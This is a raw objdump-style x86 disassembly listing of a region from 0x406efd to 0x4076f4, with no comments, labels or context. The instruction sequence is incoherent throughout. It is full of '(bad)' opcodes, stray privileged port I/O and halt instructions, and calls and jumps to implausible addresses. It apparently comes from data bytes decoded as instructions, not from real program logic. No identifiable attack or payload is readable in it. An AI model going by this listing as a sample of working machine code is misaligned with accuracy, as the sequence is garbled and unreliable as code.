  406efd:	mov    edx,0xf5111f5e
  406f02:	jns    0x406eee
  406f04:	aaa    
  406f05:	mov    al,ds:0xab82fa1d
  406f0a:	xchg   edx,eax
  406f0b:	inc    ebx
  406f0c:	dec    ebp
  406f0d:	dec    esp
  406f0e:	in     eax,0xdf
  406f10:	push   ds
  406f11:	mov    edx,0xbc907a7b
  406f16:	hlt    
  406f17:	outs   dx,BYTE PTR ds:[esi]
  406f18:	rcr    DWORD PTR [esi+edi*2-0x63],1
  406f1c:	pop    edi
  406f1d:	mov    ds:0xc64f5fa7,al
  406f22:	call   0x16ad9036
  406f27:	add    bh,0xec
  406f2a:	add    bh,BYTE PTR [esp+eiz*4-0x3f502718]
  406f31:	ret    
  406f32:	mov    al,0xe2
  406f34:	jp     0x406eb8
  406f36:	mov    eax,ds:0x36f99b75
  406f3b:	out    0x17,al
  406f3d:	adc    al,0xc7
  406f3f:	(bad)  
  406f40:	mov    WORD PTR [eax+0x206d3d81],gs
  406f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f47:	sub    ecx,DWORD PTR [eax]
  406f49:	push   cs
  406f4a:	pop    eax
  406f4b:	test   DWORD PTR [ebx+esi*1-0x6e],esp
  406f4f:	dec    edi
  406f50:	inc    ebp
  406f51:	js     0x406f2d
  406f53:	sub    ecx,DWORD PTR [ebx]
  406f55:	(bad)  
  406f56:	mov    esi,0x351e57be
  406f5b:	cld    
  406f5c:	add    al,0xb7
  406f5e:	mov    ah,0xd9
  406f60:	jno    0x406f4c
  406f62:	call   0x50f246a1
  406f67:	xor    BYTE PTR [ebx-0x454e8dc4],al
  406f6d:	xchg   edx,eax
  406f6e:	pop    es
  406f6f:	cmp    eax,0x63b5d270
  406f74:	bound  esi,QWORD PTR [ebx]
  406f76:	and    BYTE PTR [eax-0x4cf31d90],ah
  406f7c:	and    al,0x49
  406f7e:	jb     0x406fe9
  406f80:	fisttp WORD PTR ds:0x3106ed08
  406f86:	cmp    DWORD PTR [edx+0x6c1edf63],edx
  406f8c:	jns    0x406fbb
  406f8e:	and    DWORD PTR [edi+0x61],ecx
  406f91:	push   eax
  406f92:	loope  0x406f3a
  406f94:	mov    edi,0xa1d37700
  406f99:	sub    DWORD PTR [ebx-0x40ffde51],0xcce53edc
  406fa3:	and    eax,0xb01dc0ed
  406fa8:	xchg   ebx,eax
  406fa9:	das    
  406faa:	push   ecx
  406fab:	pushf  
  406fac:	mov    eax,ds:0x3ad9db72
  406fb1:	xor    al,0x34
  406fb3:	or     DWORD PTR [esi],ebp
  406fb5:	sub    BYTE PTR [ecx+eiz*8-0x163691a],ch
  406fbc:	retf   
  406fbd:	dec    esp
  406fbe:	jne    0x40701a
  406fc0:	push   cs
  406fc1:	jge    0x406fef
  406fc3:	xor    DWORD PTR [esi+0x7d],0x9c21f65d
  406fca:	cmp    eax,0x6254285f
  406fcf:	fld    TBYTE PTR [ecx-0x349360f8]
  406fd5:	(bad)  
  406fd6:	xchg   esp,eax
  406fd7:	repz sbb al,0x57
  406fda:	or     BYTE PTR [esi],cl
  406fdc:	add    al,0x51
  406fde:	mov    bh,0x4b
  406fe0:	(bad)  
  406fe1:	call   0x46f91edb
  406fe6:	add    eax,0x555932b5
  406feb:	int    0x22
  406fed:	mov    ebp,0x1400b5e3
  406ff2:	test   DWORD PTR [ebx-0x7e],edx
  406ff5:	clc    
  406ff6:	mov    edx,0x635cbff9
  406ffb:	fimul  WORD PTR [ebx+esi*8-0x13b373a8]
  407002:	xlat   BYTE PTR ds:[ebx]
  407003:	adc    DWORD PTR [eax+0x58],esp
  407006:	pushf  
  407007:	or     al,0xfb
  407009:	stos   BYTE PTR es:[edi],al
  40700a:	inc    eax
  40700b:	loope  0x406ffe
  40700d:	dec    edx
  40700e:	push   ebp
  40700f:	jl     0x40706b
  407011:	push   0xffffffb5
  407013:	je     0x407038
  407015:	pop    edi
  407016:	or     DWORD PTR [eax+0x39f3eb4c],0x7d
  40701d:	inc    ebx
  40701e:	mov    esi,DWORD PTR [esi-0x4f]
  407021:	iret   
  407022:	xor    ecx,DWORD PTR [edx]
  407024:	xchg   esi,eax
  407025:	dec    ebp
  407026:	mov    ah,0x2
  407028:	sub    DWORD PTR [ecx+0x4a390157],esp
  40702e:	push   es
  40702f:	sbb    ebp,DWORD PTR [esi-0x5f9a292a]
  407035:	scas   al,BYTE PTR es:[edi]
  407036:	xor    esi,DWORD PTR [eax-0x4a19271f]
  40703c:	out    0x44,eax
  40703e:	mov    edx,0xb323b2ee
  407043:	imul   edi
  407045:	jl     0x40705c
  407047:	clc    
  407048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407049:	out    dx,eax
  40704a:	sbb    dh,BYTE PTR [ebp+0x7e]
  40704d:	xchg   edi,eax
  40704e:	sbb    DWORD PTR [eax-0x4bc5b43],esp
  407054:	cmp    DWORD PTR [esi+0x549e1124],ebx
  40705a:	pop    ecx
  40705b:	mov    dh,bh
  40705d:	sbb    bh,bh
  40705f:	sbb    DWORD PTR ds:0x1e2b57dd,0x3e
  407066:	cmp    ah,BYTE PTR [esi]
  407068:	in     eax,dx
  407069:	mov    bl,0x7f
  40706b:	xor    esp,DWORD PTR ds:0x97eeda29
  407071:	sbb    ebp,DWORD PTR [edx+0x428abf55]
  407077:	rcl    al,1
  407079:	(bad)  
  40707a:	add    DWORD PTR [edi-0x52afff7c],edi
  407080:	mov    ch,0xa3
  407082:	adc    al,0xfe
  407084:	and    BYTE PTR [edx],ah
  407086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407087:	or     DWORD PTR [edi],0xcbbc8713
  40708d:	inc    esp
  40708e:	(bad)  
  40708f:	fstp   DWORD PTR [eax+0x4b]
  407092:	sbb    eax,0x1c
  407095:	and    ecx,DWORD PTR [eax]
  407097:	test   BYTE PTR [esi+0x37],bh
  40709a:	push   esi
  40709b:	in     eax,0xd9
  40709d:	jbe    0x4070cf
  40709f:	push   cs
  4070a0:	inc    ebx
  4070a1:	pop    ecx
  4070a2:	cmp    edi,DWORD PTR [ebx+0x5116e13a]
  4070a8:	mov    esp,esi
  4070aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ab:	fsincos 
  4070ad:	test   al,0x54
  4070af:	dec    edx
  4070b0:	loope  0x4070ca
  4070b2:	push   DWORD PTR [edx+0x6b540c46]
  4070b8:	push   ebx
  4070b9:	call   0x7aa7111e
  4070be:	mov    bh,0x95
  4070c0:	addr16 or eax,0xa267fc88
  4070c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070c7:	sub    al,0x46
  4070c9:	push   eax
  4070ca:	mov    ebx,0x5f74845f
  4070cf:	cmovne eax,DWORD PTR [edx+0x20d79007]
  4070d6:	test   BYTE PTR [ecx],al
  4070d8:	xor    al,0xaa
  4070da:	retf   0x8e76
  4070dd:	popa   
  4070de:	pop    edx
  4070df:	cmp    edi,edx
  4070e1:	xchg   edi,eax
  4070e2:	jmp    0x4070e1
  4070e4:	mov    ah,0x4d
  4070e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e7:	test   BYTE PTR [ecx+0x78a0dc05],0x81
  4070ee:	ins    BYTE PTR es:[edi],dx
  4070ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070f0:	jecxz  0x4070fe
  4070f2:	rcr    BYTE PTR [ebx+eiz*4],0xf2
  4070f6:	pop    ss
  4070f7:	add    BYTE PTR [ebp-0x5d68ca11],bl
  4070fd:	out    0xe4,eax
  4070ff:	fcom   st(4)
  407101:	mov    edx,0xa56af3b5
  407106:	or     dh,BYTE PTR ds:0xcd7d7eaf
  40710c:	imul   DWORD PTR [ebx+0x62741975]
  407112:	push   ebx
  407113:	mov    eax,ds:0x492489e4
  407118:	repz and eax,0xdd18965b
  40711e:	(bad)
  407121:	mov    bh,0xbd
  407123:	into   
  407124:	xor    BYTE PTR [ecx+ebp*4+0x6e],ch
  407128:	pop    ecx
  407129:	cmp    edx,ebp
  40712b:	arpl   WORD PTR [eax+0x7d033454],bx
  407131:	dec    ebx
  407132:	sub    al,0x17
  407134:	ja     0x407177
  407136:	jecxz  0x4070e2
  407138:	daa    
  407139:	mov    eax,ds:0x4e2c5ce8
  40713e:	(bad)  
  40713f:	rol    BYTE PTR [eax],cl
  407141:	sub    eax,0x8366d97b
  407146:	test   BYTE PTR [esi-0x1f],al
  407149:	mov    ecx,0xf57083d5
  40714e:	das    
  40714f:	add    esi,edx
  407151:	sub    dl,bl
  407153:	es mov edi,ebx
  407156:	neg    BYTE PTR [edi]
  407158:	jge    0x4071ce
  40715a:	adc    eax,DWORD PTR [edx+eax*2]
  40715d:	repz pop ss
  40715f:	xor    bp,WORD PTR [esi-0x1399b9a]
  407166:	test   al,0x29
  407168:	cmp    al,0x6b
  40716a:	cmp    ch,BYTE PTR [edx]
  40716c:	xor    DWORD PTR [eax],ecx
  40716e:	call   FWORD PTR [ebx-0x51dbbb4b]
  407174:	in     eax,0x75
  407176:	xchg   ebp,eax
  407177:	popf   
  407178:	xchg   edi,eax
  407179:	sti    
  40717a:	and    ch,0xd1
  40717d:	xor    edi,DWORD PTR [edi+0x56]
  407180:	ds stc 
  407182:	jl     0x407104
  407184:	(bad)  
  407185:	pop    edi
  407186:	push   esi
  407187:	xchg   esi,eax
  407188:	ret    
  407189:	in     al,0xdb
  40718b:	scas   eax,DWORD PTR es:[edi]
  40718c:	mov    edx,0xfc98a35f
  407191:	cli    
  407192:	fninit 
  407194:	mov    ebx,0xb23acb61
  407199:	push   edx
  40719a:	jnp    0x4071e5
  40719c:	jne    0x407149
  40719e:	in     al,dx
  40719f:	or     esi,0x8443bc9b
  4071a5:	aam    0x7d
  4071a7:	mov    DWORD PTR [ebx+0x422f2003],0x779c551f
  4071b1:	lahf   
  4071b2:	xchg   ebp,eax
  4071b3:	cmp    ebp,DWORD PTR ss:[edi]
  4071b6:	cli    
  4071b7:	xcrypt-ctr (bad)
  4071b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b9:	pop    edx
  4071ba:	jle    0x407144
  4071bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071bd:	push   0x421978b
  4071c2:	mov    edi,0x5fd23151
  4071c7:	push   esp
  4071c8:	mov    ch,0x35
  4071ca:	adc    BYTE PTR [edx],cl
  4071cc:	xchg   DWORD PTR [ebx-0x5f],eax
  4071cf:	sbb    edi,DWORD PTR [eax+0x11]
  4071d2:	les    esi,FWORD PTR [edi+0x74]
  4071d5:	xchg   ebx,eax
  4071d6:	loopne 0x407196
  4071d8:	lods   al,BYTE PTR ds:[esi]
  4071d9:	(bad)
  4071dd:	adc    eax,0xb3b0292e
  4071e2:	push   esp
  4071e3:	(bad)  
  4071e5:	das    
  4071e6:	out    dx,al
  4071e7:	stc    
  4071e8:	xchg   esp,eax
  4071e9:	push   cs
  4071ea:	aas    
  4071eb:	mov    al,ds:0xdc8ddbb9
  4071f0:	mov    edx,0x720bff3c
  4071f5:	stc    
  4071f6:	test   eax,0xf0b4dd26
  4071fb:	pop    ebx
  4071fc:	lea    ecx,[eax+0x5e97ee5]
  407202:	mov    cl,0x3a
  407204:	iret   
  407205:	bound  ebx,QWORD PTR [eax+0x39696fc3]
  40720b:	repz mov al,gs:0x7542ba63
  407212:	xor    dl,dh
  407214:	hlt    
  407215:	mov    edx,eax
  407217:	mov    ds:0x7074e45c,eax
  40721c:	push   cs
  40721d:	and    al,0x3c
  40721f:	inc    ecx
  407220:	jno    0x4071e6
  407222:	cwde   
  407223:	call   FWORD PTR [edi]
  407225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407226:	mov    ecx,0xfe04191f
  40722b:	sub    ah,BYTE PTR [ecx]
  40722d:	push   esi
  40722e:	xor    eax,0x6a41f62e
  407233:	(bad)  
  407234:	mov    ebp,DWORD PTR [edi]
  407236:	popa   
  407237:	in     eax,dx
  407238:	or     DWORD PTR [eax],eax
  40723a:	(bad)  
  40723b:	sbb    eax,0x19d47d39
  407240:	pop    ds
  407241:	mov    ch,0xf4
  407243:	aam    0x5a
  407245:	or     BYTE PTR [eax+0x6a18493a],al
  40724b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40724c:	imul   esi,DWORD PTR [edi],0x63f75049
  407252:	les    edi,FWORD PTR [esi-0x15]
  407255:	out    0xf,eax
  407257:	sub    dl,BYTE PTR [edx+0x43]
  40725a:	js     0x407261
  40725c:	sbb    eax,0x9b613925
  407261:	pop    ds
  407262:	jae    0x4071e5
  407264:	dec    eax
  407265:	and    BYTE PTR [edx+esi*4],0x95
  407269:	icebp  
  40726a:	loope  0x4072e2
  40726c:	icebp  
  40726d:	and    eax,0x49ad61e9
  407272:	sti    
  407273:	stos   DWORD PTR es:[edi],eax
  407274:	mov    esp,0x5d16195f
  407279:	jbe    0x40724f
  40727b:	(bad)  
  40727c:	call   0x43918de3
  407281:	repz aad 0x87
  407284:	outs   dx,DWORD PTR ds:[esi]
  407285:	std    
  407286:	cmp    BYTE PTR ds:0x560429f9,dl
  40728c:	and    ebx,esp
  40728e:	or     ebp,DWORD PTR [ecx+0x54]
  407291:	sbb    DWORD PTR [ebx+0x14],esi
  407294:	rol    BYTE PTR [ebx],cl
  407296:	shl    DWORD PTR ds:0x2ea61ca8,cl
  40729c:	xchg   ecx,eax
  40729d:	add    al,0x1a
  40729f:	pop    edx
  4072a0:	(bad)  
  4072a1:	mov    al,ds:0x4c8db043
  4072a6:	jb     0x407267
  4072a8:	push   edx
  4072a9:	sbb    edx,DWORD PTR ds:0x2c67d58
  4072af:	enter  0x4aee,0xd2
  4072b3:	imul   edx,DWORD PTR [ebp+0xf837b40],0x60963a45
  4072bd:	out    0x58,al
  4072bf:	in     eax,0xb6
  4072c1:	xlat   BYTE PTR ds:[ebx]
  4072c2:	pop    eax
  4072c3:	fdivr  DWORD PTR [ecx-0x5d7aeda2]
  4072c9:	icebp  
  4072ca:	lods   eax,DWORD PTR ds:[esi]
  4072cb:	push   esi
  4072cc:	pop    edi
  4072cd:	scas   al,BYTE PTR es:[edi]
  4072ce:	test   cl,ch
  4072d0:	mov    bh,0x27
  4072d2:	jno    0x407293
  4072d4:	aad    0x0
  4072d6:	xor    esp,ecx
  4072d8:	cli    
  4072d9:	and    DWORD PTR [ebx-0xa],ecx
  4072dc:	out    0x3a,eax
  4072de:	retf   0x8b6e
  4072e1:	fisttp WORD PTR [ebx]
  4072e3:	test   eax,0x723b9960
  4072e8:	ret    
  4072e9:	mov    BYTE PTR [ebx-0x7d86cbe],dl
  4072ef:	jle    0x407352
  4072f1:	mov    bl,ch
  4072f3:	adc    BYTE PTR [ecx+0x44bd6058],bh
  4072f9:	mov    cl,0x3b
  4072fb:	or     ah,ch
  4072fd:	repnz push esp
  4072ff:	ds jge 0x407374
  407302:	or     esp,DWORD PTR [eax]
  407304:	jno    0x40735c
  407306:	aaa    
  407307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407308:	push   eax
  407309:	stc    
  40730a:	add    al,0x5b
  40730d:	gs xor ecx,esp
  407310:	test   DWORD PTR [ebp+0x1d],0xd4ec67ea
  407317:	push   0x7bd1e145
  40731c:	pop    ds
  40731d:	pop    ss
  40731e:	adc    ebp,DWORD PTR [ecx+0x25]
  407321:	gs hlt 
  407323:	add    bl,BYTE PTR [ebp+0x530294c6]
  407329:	jmp    0x278e:0xae41e401
  407330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407331:	dec    edi
  407332:	jmp    0x2eda4ee1
  407337:	pop    ebp
  407338:	sub    eax,0x78205d27
  40733d:	mov    edx,0x217edc84
  407342:	loope  0x40733f
  407344:	in     eax,dx
  407345:	xchg   BYTE PTR [eax-0x45],bl
  407348:	in     eax,0xb2
  40734a:	daa    
  40734b:	pop    ss
  40734c:	push   eax
  40734d:	mov    cl,0xc
  40734f:	loop   0x40731f
  407351:	jnp    0x407396
  407353:	addr16 ret 0xf48a
  407357:	ficomp DWORD PTR [ebx+0x46]
  40735a:	fisttp DWORD PTR [esi-0x3982336e]
  407360:	(bad)  
  407361:	repnz test DWORD PTR [esi],edx
  407364:	repz pushw cs
  407367:	loopne 0x4073ce
  407369:	adc    BYTE PTR [ecx+eax*8-0x581787ed],ch
  407370:	je     0x407360
  407372:	pusha  
  407373:	shl    ecx,cl
  407375:	lods   al,BYTE PTR ds:[esi]
  407376:	sbb    esp,DWORD PTR [esi+ebp*1+0x2115c4b8]
  40737d:	(bad)  
  40737e:	cmp    BYTE PTR [bp+di+0x19],bl
  407382:	imul   edx,DWORD PTR [ebp-0x6e3e1d87],0x63e58d6b
  40738c:	mov    dl,dl
  40738e:	mov    ds:0xd513dc1a,al
  407393:	das    
  407394:	jmp    0xd6947896
  407399:	push   esp
  40739a:	pushf  
  40739b:	sub    ebx,DWORD PTR [ebp+ebp*2+0x1984f7e1]
  4073a2:	imul   eax,DWORD PTR [esi],0xffffff92
  4073a5:	or     DWORD PTR [eax],eax
  4073a7:	ins    DWORD PTR es:[edi],dx
  4073a8:	dec    edx
  4073a9:	popf   
  4073aa:	cs daa 
  4073ac:	mov    cl,0x5a
  4073ae:	leave  
  4073af:	pusha  
  4073b0:	(bad)
  4073b3:	adc    DWORD PTR [edx-0x44],0xa167a6e2
  4073ba:	xor    eax,0xc1ca92bc
  4073bf:	add    al,0x86
  4073c1:	xor    BYTE PTR [ebp+0x1d845b82],bh
  4073c7:	push   esi
  4073c8:	sub    eax,0x4991fd00
  4073cd:	(bad)  
  4073ce:	pop    ss
  4073cf:	pop    ebx
  4073d0:	xchg   edi,eax
  4073d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d2:	bnd jp 0x407359
  4073d5:	jne    0x4073a7
  4073d7:	ja     0x4073ba
  4073d9:	in     eax,0xb2
  4073db:	add    edi,ecx
  4073dd:	call   0x79b6:0x1fe8fdcf
  4073e4:	cmp    BYTE PTR [edi+ebp*4-0x1f699f7c],bh
  4073eb:	adc    al,BYTE PTR [eax]
  4073ed:	sbb    DWORD PTR [ebp+0x48],ecx
  4073f0:	xlat   BYTE PTR ds:[ebx]
  4073f1:	cs inc esi
  4073f3:	test   BYTE PTR [ebp+0xba72b53],dl
  4073f9:	cwde   
  4073fa:	mov    ch,BYTE PTR [eax-0x36397ec]
  407400:	cdq    
  407401:	jae    0x4073ff
  407403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407404:	sub    DWORD PTR [ecx],edi
  407406:	out    dx,al
  407407:	clc    
  407408:	mov    eax,ds:0x4db754af
  40740d:	hlt    
  40740e:	aas    
  40740f:	sbb    bl,0x70
  407412:	sbb    edi,DWORD PTR [ecx+0x77]
  407415:	scas   al,BYTE PTR es:[edi]
  407416:	xchg   ecx,eax
  407417:	push   cs
  407418:	ss cmp ah,ch
  40741b:	push   eax
  40741c:	scas   al,BYTE PTR es:[edi]
  40741d:	pop    eax
  40741e:	inc    edx
  40741f:	jecxz  0x40742e
  407421:	push   ebx
  407422:	lds    eax,FWORD PTR [ecx]
  407424:	jmp    0x91d1399a
  407429:	sbb    al,0x37
  40742b:	push   ss
  40742c:	xchg   DWORD PTR [ebx+0x7fae5b5a],edi
  407432:	sbb    BYTE PTR [ebx],cl
  407434:	adc    DWORD PTR [esi],0xdcefc20a
  40743a:	xchg   ecx,eax
  40743b:	mov    ebx,0x93adc54c
  407440:	adc    DWORD PTR [esi-0x2cb36bf3],esp
  407446:	xchg   esi,eax
  407447:	push   esp
  407448:	push   ds
  407449:	rcl    edi,0x9d
  40744c:	outs   dx,BYTE PTR ds:[esi]
  40744d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40744e:	and    eax,0xf42563cc
  407453:	test   eax,0x70dcc115
  407458:	in     al,dx
  407459:	jmp    0x407496
  40745b:	sbb    BYTE PTR [esi],ch
  40745d:	sub    bl,dh
  40745f:	cmp    ebp,edx
  407461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407462:	add    DWORD PTR [esi+ebp*4+0x71ed36f1],ecx
  407469:	mov    edi,0x7bd0e35d
  40746e:	push   eax
  40746f:	jle    0x4074be
  407471:	mov    BYTE PTR [ebp+ebp*8+0x2d40077d],al
  407478:	shr    BYTE PTR [esp+esi*8+0x72],0x27
  40747d:	mov    eax,ds:0x24cad649
  407482:	popa   
  407483:	push   es
  407484:	push   esi
  407485:	int3   
  407486:	jne    0x407468
  407488:	pop    ss
  407489:	(bad)  
  40748b:	jmpw   0x5982
  40748f:	xchg   ebx,eax
  407490:	mov    DWORD PTR [esi+0x582634a9],ebp
  407496:	cmp    DWORD PTR [ecx+0x6],eax
  407499:	or     al,0x65
  40749b:	ss inc ecx
  40749d:	xchg   edi,eax
  40749e:	mov    ecx,0x53a3efc0
  4074a3:	xchg   edx,eax
  4074a4:	add    BYTE PTR ds:0xf74ce27c,ch
  4074aa:	jg     0x40742e
  4074ac:	xor    eax,0x3f2d86af
  4074b1:	fs ret 
  4074b3:	jg     0x407529
  4074b5:	mov    al,0xf7
  4074b7:	call   0x514af496
  4074bc:	sbb    ah,BYTE PTR [ecx+0x35a472bd]
  4074c2:	retf   
  4074c3:	shr    BYTE PTR [eax+0xf],1
  4074c6:	(bad)
  4074ca:	dec    ebx
  4074cb:	jae    0x407476
  4074cd:	pop    ebx
  4074ce:	nop
  4074cf:	test   DWORD PTR [ebp-0x75202dd6],ecx
  4074d5:	mov    eax,ds:0xbc6977d8
  4074da:	inc    ebx
  4074db:	(bad)  
  4074dc:	stc    
  4074dd:	adc    dh,BYTE PTR [edi]
  4074df:	jl     0x40754c
  4074e1:	ds sbb eax,0x30ac3fef
  4074e7:	(bad)  
  4074e9:	jne    0x4074b9
  4074eb:	repz inc BYTE PTR [edx+0x59]
  4074ef:	je     0x40756b
  4074f1:	ds jnp 0x4074d5
  4074f4:	push   ss
  4074f5:	pop    es
  4074f6:	(bad)  
  4074f7:	jmp    0x40750c
  4074f9:	clc    
  4074fa:	pop    ebp
  4074fb:	out    dx,al
  4074fc:	push   ebx
  4074fd:	push   edx
  4074fe:	lea    ebx,[edi]
  407500:	dec    esp
  407501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407502:	jnp    0x4074e9
  407504:	sbb    esi,ecx
  407506:	cmp    DWORD PTR [ebx],edx
  407508:	jns    0x40757a
  40750a:	or     ah,BYTE PTR [eax+eax*8]
  40750d:	ret    0x6f70
  407510:	repnz add esi,esp
  407513:	stos   DWORD PTR es:[edi],eax
  407514:	stc    
  407515:	stos   DWORD PTR es:[edi],eax
  407516:	push   eax
  407517:	sub    BYTE PTR [ebx],bh
  407519:	bound  esp,QWORD PTR [ebx+eiz*1]
  40751c:	dec    ebp
  40751d:	lods   al,BYTE PTR ds:[esi]
  40751e:	mov    al,ds:0x15be1d8b
  407523:	pop    esi
  407524:	sbb    al,0xfb
  407526:	es es push esi
  407529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752b:	call   0x3beddd15
  407530:	add    DWORD PTR [esi+0x3381f2d5],esp
  407536:	test   eax,0xe7ab0325
  40753b:	test   eax,0xf37752cc
  407540:	cmp    ebx,DWORD PTR [esp+edx*4+0x9]
  407544:	pop    ss
  407545:	jle    0x4075c6
  407547:	sub    al,0xb3
  407549:	aad    0x93
  40754b:	or     edx,esp
  40754d:	loop   0x40753d
  40754f:	stc    
  407550:	mov    DWORD PTR [ebp+eiz*1+0x2c0826d5],esi
  407557:	sbb    al,0xdf
  407559:	lahf   
  40755a:	add    eax,0x34a58844
  40755f:	imul   ecx,edi,0x40895ebc
  407565:	jmp    0x6ef7:0x90a59f81
  40756c:	mov    dl,0xa1
  40756e:	icebp  
  40756f:	inc    eax
  407570:	(bad)  
  407571:	jg     0x4075db
  407573:	jno    0x8a4f62b0
  407579:	jnp    0x40752c
  40757b:	mov    eax,0xd1e59702
  407580:	test   DWORD PTR [edx-0x37],edi
  407583:	aas    
  407584:	cdq    
  407585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407586:	js     0x407539
  407588:	push   0x214c6c9c
  40758d:	(bad)  
  40758e:	xchg   edi,eax
  40758f:	test   ebx,ebx
  407591:	int    0x10
  407593:	sbb    ah,cl
  407595:	push   es
  407596:	push   ebx
  407597:	mov    BYTE PTR [ecx+esi*8-0x5b],0x1f
  40759c:	pop    eax
  40759d:	pop    es
  40759e:	in     eax,dx
  40759f:	xor    al,0x4d
  4075a1:	sub    edx,edi
  4075a3:	hlt    
  4075a4:	fisubr DWORD PTR [edx+0x186b21e9]
  4075aa:	lock cmp DWORD PTR [esi+0x64f98535],ecx
  4075b1:	dec    ecx
  4075b2:	sub    BYTE PTR [edx-0x6b6fb290],dh
  4075b8:	jne    0x407593
  4075ba:	inc    eax
  4075bb:	arpl   WORD PTR [edx+edi*2+0x6d],di
  4075bf:	mov    dl,0xb6
  4075c1:	aad    0xc6
  4075c3:	scas   al,BYTE PTR es:[edi]
  4075c4:	imul   eax,ebx,0xf223098b
  4075ca:	rcr    BYTE PTR [eax],0xaa
  4075cd:	cmp    eax,0xcba59786
  4075d2:	pop    ss
  4075d3:	rol    BYTE PTR [eax-0x2d9390c2],cl
  4075d9:	mov    edi,0x2440e5e0
  4075de:	jbe    0x40761a
  4075e0:	xlat   BYTE PTR ds:[ebx]
  4075e1:	enter  0x7a13,0x9f
  4075e5:	mov    eax,0xe74ddbf
  4075ea:	lods   eax,DWORD PTR ds:[esi]
  4075eb:	xchg   esi,eax
  4075ec:	js     0x407621
  4075ee:	or     eax,0x1d8f0a77
  4075f3:	inc    esp
  4075f4:	iret   
  4075f5:	les    ebp,FWORD PTR [esi]
  4075f7:	fadd   DWORD PTR [ecx+0x3bb5254]
  4075fd:	js     0x40766b
  4075ff:	or     bh,BYTE PTR [ecx+0xb3c7aa1]
  407605:	scas   eax,DWORD PTR es:[edi]
  407606:	(bad)  
  407607:	pop    esp
  407608:	push   cs
  407609:	inc    edi
  40760a:	mov    bl,0x84
  40760c:	stos   BYTE PTR es:[edi],al
  40760d:	sbb    BYTE PTR [ebx],dh
  40760f:	mov    ch,0x5e
  407611:	cmp    eax,0x686e28f9
  407616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407617:	call   0x5ca97197
  40761c:	cmp    bh,0xe0
  40761f:	scas   al,BYTE PTR es:[edi]
  407620:	loopne 0x4075af
  407622:	pushf  
  407623:	jmp    0x40763c
  407625:	outs   dx,DWORD PTR ds:[esi]
  407626:	pop    edx
  407627:	daa    
  407628:	or     al,0x7a
  40762a:	dec    ecx
  40762b:	imul   BYTE PTR [edi+0x11eece39]
  407631:	cmp    al,0xb5
  407633:	test   al,0xee
  407635:	ins    BYTE PTR es:[edi],dx
  407636:	sbb    ch,ah
  407638:	popf   
  407639:	repz clc 
  40763b:	jns    0x4075c7
  40763d:	imul   eax,DWORD PTR ds:0xb9ba4278,0x9642ba1e
  407647:	pop    esi
  407648:	xchg   BYTE PTR [esi+0x322a55ef],dh
  40764e:	mov    eax,0xaad6b4d5
  407653:	in     eax,dx
  407654:	retf   
  407655:	mov    ecx,DWORD PTR [edx-0x4412fe23]
  40765b:	ds ret 0xcd78
  40765f:	inc    DWORD PTR [ecx-0x6]
  407662:	sub    al,0x2c
  407664:	and    ecx,esi
  407666:	ss ja  0x40762b
  407669:	psubb  mm4,QWORD PTR [edi+edi*4-0x7b]
  40766e:	xchg   ebp,eax
  40766f:	fucomi st,st(4)
  407671:	add    edx,DWORD PTR [edi]
  407673:	stc    
  407674:	or     eax,0x1c0e2161
  407679:	gs sub al,0x1e
  40767c:	scas   eax,DWORD PTR es:[edi]
  40767d:	test   cl,0xa6
  407680:	ret    0x4667
  407683:	inc    ebx
  407684:	imul   DWORD PTR [edi]
  407686:	or     BYTE PTR [ebx+0x78],ah
  407689:	and    al,0x65
  40768b:	mov    dh,0xd7
  40768d:	mov    bl,0xda
  40768f:	aad    0x25
  407691:	ins    BYTE PTR es:[edi],dx
  407692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407693:	pop    eax
  407694:	mov    ds:0xee6ea6d9,eax
  407699:	outs   dx,BYTE PTR ds:[esi]
  40769a:	retf   
  40769b:	ss loopne 0x4076e8
  40769e:	sub    dl,ch
  4076a0:	xor    al,0x22
  4076a2:	call   0xab31:0xca062846
  4076a9:	push   edx
  4076aa:	or     BYTE PTR [ebx+0x994c061],al
  4076b0:	lds    eax,FWORD PTR [ecx-0x73]
  4076b3:	dec    ebx
  4076b4:	sbb    BYTE PTR [ecx+eiz*4-0x73],ch
  4076b8:	test   al,0x52
  4076ba:	lods   eax,DWORD PTR ds:[esi]
  4076bb:	in     al,0x7e
  4076bd:	shl    BYTE PTR [edx-0x7c],0x39
  4076c1:	fs jb  0x407696
  4076c4:	scas   eax,DWORD PTR es:[edi]
  4076c5:	fild   QWORD PTR [eax-0x33]
  4076c8:	dec    edi
  4076c9:	xchg   esi,eax
  4076ca:	dec    ecx
  4076cb:	aam    0x91
  4076cd:	dec    ebx
  4076ce:	pop    ds
  4076cf:	inc    ecx
  4076d0:	lds    ebx,FWORD PTR [ecx-0x12]
  4076d3:	test   al,0xd3
  4076d5:	add    DWORD PTR [ebx+eax*4+0x18],ebx
  4076d9:	call   0x744da2a6
  4076de:	cdq    
  4076df:	mov    BYTE PTR [eax+eax*2],bh
  4076e2:	aaa    
  4076e3:	(bad)  
  4076e4:	in     eax,dx
  4076e5:	mov    ds:0x2cb059e7,eax
  4076ea:	adc    DWORD PTR [edx+esi*1-0x7b4c9af],edi
  4076f1:	stc    
  4076f2:	mov    bh,0xc2
  4076f4:	sbb    eax,0xd4428141
